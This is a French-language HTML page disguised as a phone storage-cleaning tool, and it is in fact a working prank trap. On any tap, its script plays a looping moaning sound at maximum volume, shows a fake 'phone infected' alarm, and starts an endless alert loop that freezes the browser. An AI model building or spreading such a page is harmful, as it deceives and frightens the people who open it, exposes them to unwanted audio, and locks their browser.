
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Nettoyage Système...</title>
    <style>
        body { background: black; color: #0f0; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; touch-action: none; }
        .container { text-align: center; padding: 20px; }
        .btn { padding: 20px 40px; border: 2px solid #0f0; background: transparent; color: #0f0; font-size: 1.5rem; font-weight: bold; cursor: pointer; border-radius: 10px; }
    </style>
</head>
<body onclick="lancerPiege()" ontouchstart="lancerPiege()">

    <div class="container" id="ui">
        <h1 style="font-size: 1.2rem;">ANALYSE DU STOCKAGE EN COURS...</h1>
        <p style="color: #666;">(Appuyez pour accélérer le processus)</p>
        <button class="btn">NETTOYER MAINTENANT</button>
    </div>

    <audio id="cri" loop preload="auto">
        <source src="https://www.myinstants.com/media/sounds/loud-moaning-sound-effect-original.mp3" type="audio/mpeg">
    </audio>

    <script>
    function lancerPiege() {
        var audio = document.getElementById('cri');
        
        // On met le volume au maximum via le code
        audio.volume = 1.0;
        audio.play().catch(function(error) {
            console.log("Le navigateur bloque encore : ", error);
        });

        // Changement visuel immédiat
        document.body.style.backgroundColor = "white";
        document.getElementById("ui").innerHTML = "<h1 style='color:red; font-size:2rem;'>ALERTE : TÉLÉPHONE INFECTÉ !</h1>";

        // Boucle d'alertes infinies (bloque le navigateur)
        setTimeout(function() {
            while(true) {
                alert("ERREUR CRITIQUE : SYSTÈME COMPROMIS !");
            }
        }, 100);
    }
    </script>
</body>
</html>
